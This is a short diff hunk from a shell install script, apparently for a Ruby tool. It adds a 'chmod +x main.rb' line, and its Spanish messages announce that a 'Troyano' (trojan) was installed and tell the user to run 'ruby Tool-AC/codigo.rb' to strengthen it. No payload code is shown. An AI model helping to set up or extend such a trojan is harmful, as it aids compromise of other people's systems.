@@ -69,6 +69,7 @@ usern()
 	mkdir 
 	echo "instalando gemas"
 	bundle
+	chmod +x main.rb
 	echo "Troyano instalado con exito, para potenciarlo ejecuta:"
 	echo "'ruby Tool-AC/codigo.rb'"
 }
